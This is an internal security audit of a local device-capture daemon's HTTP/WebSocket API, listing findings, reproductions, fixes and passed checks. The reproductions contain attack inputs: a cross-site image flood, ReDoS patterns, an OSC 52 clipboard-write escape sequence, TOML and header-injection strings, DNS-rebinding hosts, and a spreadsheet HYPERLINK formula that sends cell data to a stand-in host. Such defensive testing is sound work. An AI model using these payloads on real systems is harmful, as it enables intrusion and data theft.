# api: REST/WS contract and security (2026-09-23, HEAD 6e4f6f7)

Scratch, probes and logs: `~/tt-data/mcuscope-2026-09-23/api/` (`probe1.py`/`probe1.out` is the full boundary sweep over every route).
Daemon runs: `start.sh` with `--sim`, a throwaway TOML and its own `db_path`, all three `MCUSCOPE_*_DIR` in scratch, ports 18640/18641 (with 18645/18646 for the attack page and a header logger).

## API-1 HIGH CONFIRMED: device writes queue behind session export builds on the default executor

- Where: `serial_link.py:1116` (`send_raw`), `:1145` (`send_break`), `:1174` (`send_command`) write via `asyncio.to_thread`.
  `server.py:1427` and `:1565` build every session export and bundle via `asyncio.to_thread` too.
  All of them share one default pool (12 workers on this 8-core box).
- Failure: a few concurrent session downloads (a UI user, or the cross-site page in API-2) hold every worker for tens of seconds.
  Every write to every port then waits behind them.
  `timeout_ms` does not cover that wait: `pend.sent_ts` is stamped before the write is queued, and `wait_for` starts after it.
- Repro: 100 MB capture, 40 concurrent `GET /sessions/2/export`, then `POST /cmd {"cmd":"ping","timeout_ms":1000}`.
  - Baseline: 0.07 s.
  - During the flood: 32.56 s, answered `{"status":"ok", "latency_ms": 32484}`.
  - `POST /send` 32.52 s, `GET /config` and `GET /devices` 0.08 s -> 31.7 s.
- Consequences:
  - The port's `_cmd_lock` is held for the whole stall, so every queued command waits too.
  - The stored `cmd` row's `ts` is 32 s earlier than the bytes reached the wire, so the capture timeline is wrong by the stall.
- Fix:
  - Give device writes a private pool, as `_join_pool` already is for the join.
  - Or run export/bundle builds on a dedicated pool of 1-2 workers and answer 503 past a small queue.
  - Either way, stamp `sent_ts` after the write returns.
- Class 1: writes are the latency-critical work now sharing the default executor that the 2026-08-01 inversion freed.

## API-2 MEDIUM CONFIRMED: a cross-site page can trigger the heavy GETs (disk amplification, pool starvation)

- Where: `server.py:594` `_SameOriginGuard` checks only `Host` and a present `Origin`.
  SPEC 3.1 (SPEC.md:352) accepts blind cross-site GETs on the stated condition that "GET endpoints stay cheap and side-effect free".
  Several do not:
  - `/sessions/{ref}/export` and `/bundle` write a full copy of the session beside the capture.
    The bundle also holds `_sweep_lock`, blocking retention and purge.
  - `/lines?match=` and `/lines/export?match=` occupy the match pool for up to `MATCH_BUDGET_S` each.
- Repro 1 (`www/attack.html` served from `http://127.0.0.1:18645`, driven by `browse.py` in headless Chromium):
  - 20 `new Image().src = "http://127.0.0.1:18640/sessions/2/export?i=N"`.
  - The data dir peaked at 18 concurrent `mcuscope-session-*.db` files, 903 MB, from a 101 MB capture (`tmpwatch.out`).
  - Chromium sent no `Origin` on these loads (`hdrlog.out`: `Sec-Fetch-Site: same-site`, `Sec-Fetch-Mode: no-cors`).
  - Scaled to a real multi-GB capture this fills the disk, and the store's writes then fail (`write_errors`: capture loss).
- Repro 2: 16 concurrent `GET /lines?match=M*M*Y&limit=1` (each about 1.5 s over 4 KB rows).
  `POST /wait {"match":"monitor","send":"ping","timeout_ms":2000}` then took 25.3 s instead of 0.03 s: the match hop at `server.py:2411` is not bounded by the wait's deadline.
  `/assert` live (`:2686`) is the same.
- Not tested: Chrome's Local Network Access permission prompt for public-to-loopback requests.
  It is not exercised from a loopback-served page, and Firefox has no equivalent.
- Fix:
  - In `_SameOriginGuard`, refuse `Sec-Fetch-Site: cross-site` and `same-site`.
    Exempt `Sec-Fetch-Mode: navigate` to `/` and `/ui/...`.
    The UI's own requests are `same-origin`, a typed URL is `none`, and the CLI sends none.
  - Cap concurrent export builds (see API-1).
  - Bound the /wait and /assert match hops by the remaining window.
  - Amend SPEC 3.1 to say the guard now covers no-cors GETs.

## API-3 MEDIUM CONFIRMED: a regex killed mid-export is a 200 with a cut stream, and the CLI reports "daemon unreachable" (exit 3)

- Where: `server.py:1729-1737`. `StreamingResponse` sends 200 headers before the first page runs.
  `MatchBudgetExceeded` raised by `store.py` `_query_lines_on` inside the generator then aborts the chunked body.
- SPEC 3.1 (SPEC.md:374-375): exceeding the budget "returns 400", and "a killed pattern must reach the caller as an error (exit 1)".
- Repro: marker `"a"*60 + "!"`, then:
  - `mcu log export --match '(a|aa)+$' --csv -o f` gives `daemon unreachable at ...: incomplete chunked read`, exit 3, no file.
  - Without `-o`, 162 bytes of partial JSONL on stdout, then exit 3.
  - `mcu lines --match` over the same rows exits 1 with `match pattern exceeded the matching time budget`.
  - Raw HTTP: `200`, then `RemoteProtocolError` after 0.36 s, even with the hostile row on the first page.
- An agent reading exit 3 concludes the daemon died and may restart it.
- Fix:
  - Pull the first page before returning the `StreamingResponse`, so a first-page trip is a real 400.
  - For later pages, have the CLI map a body cut short after a 200 on an export to exit 1 ("export aborted by the daemon") once a `/status` probe answers.
- Classes 9 and 70.

## API-4 MEDIUM CONFIRMED: unknown body fields and query params are silently ignored, so a misspelled scope yields an authoritative verdict

- Where: every request model in `server.py:205-356` (pydantic's default `extra="ignore"`) and every query handler (FastAPI drops undeclared params).
- Repro (`POST /assert`):
  - `{"forbid":["daemon stop"],"session":"nope"}` returns 400 `no such session: nope`.
  - `{"forbid":["daemon stop"],"sesion":"nope"}` returns 200, judged over the whole capture.
  - `{"expect":["x"],"timeout":5000}` (meant live) returns 200 `pass`, retrospective over the whole capture.
  - `POST /wait {"match":"x","timout_ms":50}` runs the default 2000 ms.
  - `GET /lines?chans=sys` returns every channel.
- SPEC 3.4 (SPEC.md:774-775) refuses an other-mode field precisely because "accepting one silently would answer over a window the caller did not select while the verdict still reads authoritative".
  A typo reaches the same outcome.
- Fix:
  - Add `model_config = ConfigDict(extra="forbid")` on every body model (422 naming the field).
  - Add a small dependency that 422s undeclared query params on the API routes.
  - This is also the server half of class 53: a newer client's new field would then fail loudly against this daemon.

## API-5 MEDIUM CONFIRMED: `since_id` below -2^63 is a 500 on five routes, and the 500 drops the keep-alive connection

- Where: `server.py:1679`, `1708`, `1748`, `1847`, `1866`: `since_id` has `le=MAX_LINE_ID` and no lower bound.
- Repro: `GET /lines?since_id=-999999999999999999999999999999` returns 500 `Python int too large to convert to SQLite INTEGER`.
  The same happens on `/lines/export`, `/can/frames`, `/plot/series` and `/plot/export`.
  In `probe1.out`, the next request on the same httpx keep-alive connection failed with `Connection reset by peer` (5 of 5 times).
  Starlette re-raises after the 500 handler, and uvicorn closes the socket.
- SPEC 3.3.1 (SPEC.md:537-538): an out-of-range integer is a 422, never an OverflowError 500.
- Fix: `ge=-MAX_LINE_ID` (or clamp: any negative `since_id` means "from the start").

## API-6 MEDIUM CONFIRMED: `POST /ports` has no length bound on `device` or `serial_number`

- Where: `server.py:205-208`. `PortAttach.device`/`serial_number` are bare `str`, where `ConfigPortEntry` (`:346-347`) caps them at 512/128.
- Repro:
  - `POST /ports {"alias":"big","device":"/dev/nonexist"+"x"*200000}` returns 200.
    It stored a 600,129-character `sys` row (`port big: open ...` names the device three times).
  - A 200k `serial_number` stored a 200,039-character row.
  - `GET /status` grew to 401,620 bytes, re-sent on every UI/CLI poll while attached.
  - The rows stay in the capture after detach.
- This is the hole SPEC 3.4 `/marker` closed for its own `port` field, reopened through attach.
- Fix: the same `max_length` as `ConfigPortEntry`, via one shared constant.
- Class 19.

## API-7 LOW CONFIRMED (passthrough) / SUSPECTED (impact): target-sent terminal escape sequences reach the operator's terminal

- Where: `serial_link.py:778` decodes rx as ASCII with `replace`, so ESC and BEL pass.
  `render.py:19` `fmt_line` prints `raw` verbatim for `mcu lines`, `mcu tail` and `mcu log export`.
- Repro: a marker `before\x1b]52;c;ZWNobyBwd25lZA==\x07\x1b[1A\x1b[2Kafter`, then `mcu lines --chan marker --limit 1 | od -c`: the bytes are verbatim.
  A device line takes the same path.
- Impact (not driven): OSC 52 writes the clipboard in terminals that allow it (kitty, iTerm2, Windows Terminal, tmux with `set-clipboard on`).
  Cursor-up/erase sequences can overwrite earlier lines a human is reading.
- Fix: when stdout is a TTY, render C0 controls other than TAB as `\xNN` or `^[` in the human output.
  Leave `--json` and file output faithful.
  Colour-log firmware may want a flag to pass SGR through.

## API-8 LOW CONFIRMED: `PUT /config/ports` saves control characters that make the file invalid TOML 1.0

- Where: `server.py:1266-1267` strips but does not check `serial_number`.
  `/config/server` and `/config/storage` refuse characters below 0x20 (`:1137`, `:1155`).
- Repro: `serial_number` `"a\"\n[server]\nhost = \"0.0.0.0\"\n \u0000\u001b"` returns 200.
  - tomlkit 0.15.1 escaped it (no injection).
  - But it wrote ESC as `\e`, a TOML 1.1 escape.
  - `tomllib.load` fails: `Unescaped '\' in a string (at line 11, column 62)`.
  - The daemon's own tomlkit reader still accepts the file.
- Fix: refuse characters below 0x20 in `serial_number` and `device` as the sibling sections do.
- Class 19.

## API-9 LOW CONFIRMED: lax type coercion on request bodies

- Where: every body model runs in pydantic lax mode.
- Repro (`probe1.out`):
  - `POST /break {"ms": true}` sends a 1 ms break (200).
  - `POST /purge {"all": "yes"}` and `{"all": 1}` are read as `all: true`.
  - `{"dry_run": "true"}` is accepted; by the same rule `"no"`/`"0"` mean false and the purge runs for real.
- SPEC 3.4: "422: a field outside its declared type".
- Fix: `ConfigDict(strict=True)` on body models. Strict mode still accepts an int for a float field in JSON.

## API-10 LOW, owner should pick: `/lines/export?format=csv` leaves the device-sent `raw` cell unguarded against formula injection

- Where: `server.py:2931` (`formula_guard=False`), as SPEC 3.4 (SPEC.md:737) specifies for faithfulness.
- Risk: a hostile or compromised target that prints `=HYPERLINK("http://x/?"&A1,"ok")` or a DDE payload gets it evaluated when the operator opens the export in a spreadsheet.
  Channel names get the guard for exactly this reason, and `raw` is the larger device-controlled surface.
- Options:
  - Keep it faithful, and state the risk next to the CSV export in SPEC and in `mcu ai-guide`.
  - Or guard `raw` in CSV only, with jsonl as the faithful format.

## API-11 LOW CONFIRMED: a non-Bearer `Authorization` header disables `X-Auth-Token`

- Where: `server.py:720-728`. When any `Authorization` header is present, a non-Bearer scheme returns None and `X-Auth-Token` is never read.
- Repro: from the LAN address, `Authorization: Basic xx` plus a correct `X-Auth-Token` returns 401.
- SPEC 3.1 lists the two forms as alternatives.
  The bundled UI and CLI use Bearer, so only third-party clients behind a Basic-auth proxy hit it.
- Fix: fall through to `X-Auth-Token` when `Authorization` is not Bearer.

## Checked and fine

- CSRF, from `http://127.0.0.1:18645` in headless Chromium (`www/attack.html`). No `csrf*` row reached the capture on any path:
  - no-cors POST `text/plain` to `/marker` and `/send`: 403.
  - CORS JSON POST: 403 on the preflight.
  - `sendBeacon`: 403.
  - `enctype=text/plain` form POST: 403.
  - WebSocket: 403 handshake.
- DNS rebinding:
  - `Host: evil.test` refused 403 on API and `/ui/`.
  - Chromium with `rebind.test` mapped to 127.0.0.1 got 403 on `/ui/`.
  - `localhost.`, `127.0.0.1.`, `0x7f000001` and `2130706433` are refused.
  - `[::1]`, `LOCALHOST` and `[::ffff:7f00:1]` are allowed (IP literals cannot be rebound).
- Origin compare: `null`, empty, a trailing `/`, another port, and `localhost` against a `127.0.0.1` Host are all refused.
  A scheme-only difference passes, which no browser can produce on one port.
- Token path (0.0.0.0 bind, token set, LAN client):
  - No token: 401. `?token=` on HTTP: 401 (WS only, as specified).
  - Bearer and X-Auth-Token: 200.
  - `/`, `/ui/` served without the token.
  - `POST /shutdown` with a token: 403.
  - 11 wrong tokens: 429 `Retry-After: 60`, and the correct token stays locked out; loopback is unaffected.
  - WS: no token, wrong token, and bad Origin are all a 403 handshake; `?token=` opens.
- Static traversal: `/ui/../status`, `/ui/..%2fstatus`, `/ui/%2e%2e/...`, `/ui//status` all 404; `//status` still needs the token.
- File naming: a session named `x"\r\nSet-Cookie: a=b ../..\\CON` exports as `x___Set-Cookie__a_b_.._.._CON*` in all three `Content-Disposition` headers.
  Bundle member names come from sanitised port stems and a digit sid.
- Device allowlist: `spy://` (any case), `loop://`, `hwgrep://`, `alt://`, `cp2110://` and any `?` query are all refused on `POST /ports` and `PUT /config/ports`.
- TOML injection through `device`: refused (`invalid device string`). Through `serial_number`: escaped by tomlkit (see API-8 for the side effect).
- ReDoS: `(a|aa)+$` over a hostile row is a 400 in 0.7-1.7 s on `/lines`, `/wait`, live `/assert` and retrospective `/assert`.
- Web UI HTML sinks: no `innerHTML`/`insertAdjacentHTML`/`eval` in `webui/*.js`, and none in vendored uPlot.
  The update link's `href` is scheme-checked (`statusbar.js:139`).
- Access log is off (`log_level="warning"`), so a WS `?token=` never lands in a log.
- Boundaries, all driven in `probe1.py` and matching SPEC:
  - negative/huge `limit` (422/clamped), `decimate` 0 and negative (floor 1, same rows as 1 with `id_to` pinned), `last_ms` -1/huge.
  - non-finite `since_ts`/`until_ts`/`before_ts`, CAN id list edge cases, `bus` 0/10, `format` values.
  - `/purge` selector count, `/break` 0/2001/1.5, `/cmd` 0/300001/1e308/empty.
  - `/wait` `since`, `repeat_ms` and `eol` rules, `/assert` 16-pattern total and mode exclusions.
  - `/marker` text and port bounds, `/sessions` name bounds, `DELETE /sessions/{id}` bounds.
  - config section bounds, duplicate aliases, `/plotjuggler` dest grammar including Arabic-Indic digits.
- Duplicated query params: last wins for scalars, and repeated `chan` is a list, as specified.

## Not covered

- Chrome Local Network Access and Firefox behaviour for a truly public origin (API-2 was driven from a loopback-served page).
- Actually filling a disk to show `write_errors` from API-2 (no small filesystem available without sudo).
- WS gap object, keepalive, subscriber cap (1013) and shutdown close (1001): not re-driven this round.
- Non-ASCII tokens (header latin-1 decode against UTF-8 compare); Windows-only paths.
- A multi-user host: loopback is trusted by SPEC 3.1, so any local user can drive the API; not treated as a finding.
